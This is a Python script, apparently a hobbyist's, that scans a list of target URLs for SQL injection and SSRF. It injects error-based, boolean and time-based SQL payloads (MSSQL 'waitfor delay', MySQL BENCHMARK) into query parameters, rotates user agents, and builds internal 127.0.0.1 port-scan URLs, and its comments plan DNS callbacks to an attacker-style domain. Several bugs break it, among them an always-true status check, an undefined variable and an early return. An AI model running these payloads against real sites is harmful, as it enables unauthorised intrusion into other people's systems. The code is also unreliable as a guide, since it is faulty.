#my own shitty sqli injection tool Blind as Well as Error Based plus a new SSRF detection addon
#what I'm trying is to find inputs that allow requests to a file which could allow us to attempt ssrf aka server side request forgery
from urllib.parse import parse_qs, urlparse , urlsplit
try:
    import urlparse
except ImportError:
    import urllib.parse as urlparse
from urllib.parse import urlencode
import requests
import os
import sys
import mechanize
from collections import OrderedDict
import urllib.request
import binascii
from random import choice
import urllib
#from dns_test import *

import json

#possible user input sinks or things grabbing files possibly allowing ssrf? not sure but sure am trying to learn this
ssrf_test_list = ["http://","https://","ftp://",".jpg",".png",".gif",".pdf",".doc",".docx",".ppt",".pptx",".docm",".html",".jsp",".asp",".aspx",".csv",".xml"]
possible_ssrf_sinks = []
scrape_post_urls = []
get_inj_tests = []
basic_sql = "'"
blind_mssql = """\' waitfor delay \'00:00:10\'--""" #detect 10 sec resp for blind sqli mssql
blind_mysql = "BENCHMARK(5000000,ENCODE(\'MSG\',\'by 5 seconds\'))" #gauge base response and time after this a few times to figure out similiar to time delay
b_unescaped_true = "OR 1=5-4"
b_escaped_true = "'OR 1=5-4"
poss_blind_sqlis = []
poss_sqlis = []
#https://github.com/0xhex/google-dork-scanner/blob/master/scanner.py borrowed this and modded it to use a list more efficient added more errors
sql_errors =["sql" ,"SQL","MySQL","MYSQL","MSSQL","unclosed quotation mark","syntax error","adodb","recordset"]
url_tampering = []

#http://edmundmartin.com/random-user-agent-requests-python/
desktop_agents = ['Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36',
                 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36',
                 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36',
                 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/602.2.14 (KHTML, like Gecko) Version/10.0.1 Safari/602.2.14',
                 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36',
                 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.98 Safari/537.36',
                 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.98 Safari/537.36',
                 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36',
                 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36',
                 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0']

def blind_ssrf_tester(host_hash,target_param):
    #TODO collab like possible coding needed
    #here we use generated hash per host and check whether it can be resolved via our nameserver
    #https://www.netsparker.com/blog/docs-and-faqs/netsparker-hawk-detects-ssrf-out-of-band-vulnerabilities/
    print("test")

    
def internal_ssrf__port_scanner():
    #feed back 100 urls in list to test against each individual sink mock ssrf port scan 
    draino = []
    for i in range(1,100):
        sink_cleaner = 'http://127.0.0.1:'+int(i)
        draino.append(sink_cleaner)
    return draino


def parse_url(url):
    try:
       print(url)
       parsed = urllib.parse.urlparse(url,allow_fragments=False)
    
       if parsed.query:
       
        
          if url not in get_inj_tests:
             get_inj_tests.append(url)
      
        
          else:
           
              if url not in scrape_post_urls:
                 scrape_post_urls.append(url)

    except Exception as shit:
        print(shit)
        pass
    

 
def random_headers():
    return {'User-Agent': choice(desktop_agents),'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'}


#pass in target urls with original and tampered versions this should be a fun puzzle
def injection_logic(initial_urls):
    try:
        clean_urls = json.dumps(initial_urls)
        clean_urls = json.loads(clean_urls)
        clean_first = clean_urls['original_url']
        tampered_url = clean_urls['tampered_url']
        #load an initial base response into var
        base_response,time,headers,status_code = requester_get(clean_first.rstrip())
        if base_response:
           print("*"*40)
           print("Baseline Response Received Making second request to gauge response\n")
           print("*"*40)
           print(str(status_code)+"\n")
           try:
               # error based injection
               second_response,time,headers,status_code = requester_get(tampered_url.rstrip())
               if "400" or "500" in str(status_code):
                  print(str(status_code))
                  error_dict = {}
                  error_dict['original_url'] = clean_first
                  error_dict['tampered_url'] = tampered_url
                  error_dict['base_response'] = base_response
                  error_dict['second_response'] = second_response
                  error_dict['status_code'] = status_code
                  error_dict['time'] = str(time)
                  poss_sqlis.append(json.dumps(error_dict))

               if "200" in str(status_code):
                   print("success")#possible blind bases here use time based payloads
                   #if second_response:
               
                   print(second_response)
                   set1 = set(base_response.items())
                   set2 = set(second_response.items())
                   diffd = set2 - set1
                   #compare both sets to see if we get a diff on any fields may indicate an issue
                   if diffd:
                      print("Possible diff detected in responses")
                      info_scanner = {}
                      info_scanner['url'] = initial_url
                      info_scanner['baseline_response'] = base_response
                      info_scanner['second_response'] = tampered_url
                      poss_sqlis.append(json.dumps(info_scanner))
                   else:
                      pass
               
           except Exception as secondtry:
               print(secondtry)
               pass
        
    except Exception as err:
        print(err)
        pass


    
#use to get a valid baseline response than use the attack compare responses and see if we get error if not  compare times etc
def requester_get(url_in):
    
    req = requests.get(url_in,timeout=3,verify=False,headers=random_headers(),allow_redirects=False)
    
    return  req.text,req.elapsed,req.headers,req.status_code
    

def attack_prep(url_file):
    unparsed_urls = open(url_file,'r',encoding='utf-8')
    for urls in unparsed_urls:
        try:
           parse_url(urls)
           #url_discovery(urls,"20")
        except:
            pass
    print("Detected:"+ str(len(get_inj_tests)))  
    #spider for additional hosts
  


    #vuln scanner portion
    clean_list = set(OrderedDict.fromkeys(get_inj_tests))
    reaasembled_url = ""
    results_crawled = ""
    for query_test in clean_list:
        output = open("outputssrfsinks.txt","a")
        url_clean = urllib.parse.unquote(query_test)
        print(url_clean)
        url_object = urllib.parse.urlparse(url_clean,allow_fragments=False)
        
        #parse query paramaters
        url_query = query_test.split("?")[1].strip()
        #print(url_query)
        #https://stackoverflow.com/questions/50058154/parsing-query-parameters-in-python
        dicty = {x[0] : x[-1] for x in [x.split("=") for x in url_query.split("&") ]}
        print(dicty)
        query_pairs = OrderedDict([(k,v) for k,vlist in dicty.items() for v in vlist])
        
        
        reaasembled_url = "http://" + str(url_object.netloc) + str(url_object.path) +  '?'
        #use host hash to implement blid ssrf test to resolve from a nameserver for domain
        #if our domain is sssrfevil.net we set up a mock dns server log requests and search for request
        # host_hash.sssrfevil.net trying to resolve against the name server but with a twist append variable tested to domain
        # "param_header"+param+"_"+host_hash.sssrfevil.net so we parse at the backend from header to trailing _
        host_hash = binascii.hexlify(os.urandom(16))
        temp_sqli_query = {}
        #here we will manipulate the url paramters and create a basic vuln scanner
        for k,v in dicty.items():
            
            print(k,v)
        
            #print(urllib.unquote(v).decode('utf8'))
            #test for possible ssrf sinks
            for item in ssrf_test_list:
                if item in v:
                   print("-"*20)
                   print("Possible SSRF Sink Found")
                   print("-"*20)
                   print(urllib.parse.unquote(v).decode('utf8'))
                   possible_hit = {'Url':url_clean,'Possible_sink':k,"Value":urllib.parse.unquote(v).decode('utf8')}
                   possible_ssrf_sinks.append(possible_hit)
                   print("-"*20)
                   output.write(str(possible_hit)+"\n")
        
            entry_data_local = {k:v + basic_sql}
            #blind sqli tests escaped and unescaped tests
            local_blind_true_unescaped = {k:v +""+ b_unescaped_true}
            local_blind_true_escaped = {k:v +""+ b_escaped_true}
            temp_sqli_query.update(entry_data_local)
        reaasembled_query = urlencode(temp_sqli_query)
        full_url = reaasembled_url + reaasembled_query
        print(full_url)
        print(query_test)
        tamper_data = {}
        tamper_data['original_url'] = url_clean
        tamper_data['tampered_url'] = full_url
        #append a copy of original request and tampered for later baseline fingerprinting tests
        url_tampering.append(json.dumps(tamper_data))
        
        
        #now we call the sql injection test
        try:
           results = injection_logic(tamper_data)
           print(results)
        except Exception as ex2:
            print(ex2)
            pass
        '''
        for sinks in possible_ssrf_sinks:
            print(str(sinks))
            try:
               #each individual paramter is tested against a local port scan to see if its vulnerable
               port_prepper = internal_ssrf__port_scanner()
               #now for each paramter iterate over these analyze response and see if its vuln
               #you need a baseline response first from the page to test for errors
            except:
                pass
        
      
        '''
        output.close()
        return poss_sqlis
        
results = attack_prep(sys.argv[1])
if results:
   print(results)
